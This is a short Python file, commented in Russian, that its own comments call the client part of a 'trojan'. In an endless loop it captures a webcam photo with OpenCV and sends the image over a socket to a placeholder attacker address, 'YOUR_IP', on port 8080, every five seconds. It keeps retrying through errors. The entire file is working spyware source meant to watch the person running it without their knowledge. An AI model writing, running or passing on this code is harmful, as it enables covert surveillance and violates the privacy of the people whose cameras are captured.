# Файл клиентской части нашего "трояна", который будет отправлять фото с веб-камеры на сервер
import socket
import cv2
import time

while True:
    try:
        # Создаем сокет
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Адрес сервера 
        SERVER_HOST = 'YOUR_IP'  # Сюда вставить адрес, полученный из файла get_ip.py
        SERVER_PORT = 8080
        server_address = (SERVER_HOST, SERVER_PORT)
        
        # Пытаемся подключиться к серверу
        client_socket.connect(server_address)
        print("Connected to server")

        # Захватываем изображение с веб-камеры
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        cv2.destroyAllWindows()

        # Декодируем его
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
        result, encimg = cv2.imencode('.jpg', frame, encode_param)

        # Отправляем изображение на сервер
        client_socket.sendall(encimg.tobytes())

        # Закрываем сокет
        client_socket.close()
        print("Disconnected from server")

        # Ждем 5 секунд перед повторной попыткой подключения
        time.sleep(5)

    # Обязательно отлавливаем ошибки
    except ConnectionRefusedError:
        print("Server is not available. Waiting for 5 seconds...")
        time.sleep(5)
        
    except Exception as ex:
        print(ex)
        time.sleep(5)
